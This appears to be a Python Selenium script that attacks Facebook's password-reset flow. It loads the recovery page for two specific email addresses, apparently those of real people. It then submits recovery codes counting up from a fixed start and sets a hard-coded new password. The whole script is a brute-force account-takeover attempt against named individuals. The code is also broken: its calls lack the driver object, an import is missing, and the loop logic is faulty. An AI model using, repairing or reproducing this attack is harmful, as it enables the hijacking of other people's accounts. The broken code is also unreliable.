from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service

"""usr=input('Enter Email Id:') """
"""pwd=input('Enter Password:')"""
x = 10000000
def driver(request):
    """Set up webdriver fixture."""
    usr=input('Enter Email Id:')
    options = Options()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    service = Service(executable_path="firefox.geckodriver")
    driver = webdriver.Firefox(options=options, service=service)
    driver.set_window_size(1920, 1080)
    driver.maximize_window()
    driver.implicitly_wait(10)
    driver.get("https://www.facebook.com/login/web/?email=amschwab%40comcast.net&is_from_lara=1")
    driver.get("https://www.facebook.com/login/web/?email=ppteam17514%40gmail.com&is_from_lara=1")
    driver.implicitly_wait(10)
    login_box = find_element(By.NAME, 'reset_action')
    login_box.click()
    driver.implicitly_wait(10)
    input = find_element(By.ID, 'recovery_code_entry')
    input = send_keys(x)
    cont = find_element(By.NAME, 'reset_action')
    cont.click()
    y = find_element(By.Class, '_585r_50f4')
    z = find_element(By.Class, '_585r_50f4')
    while z == y:
        x += 1
        driver.implicitly_wait(10)
        input = find_element(By.ID, 'recovery_code_entry')
        input = send_keys(x)
        cont = find_element(By.NAME, 'reset_action')
        cont.click()
        input = send_keys(x)
        if x == 10000002:
            break
    input = find_element(By.ID, 'password_new')
    input = send_keys('!04Hp9004')

    yield driver
    yield y
    print(y)
    driver.close()
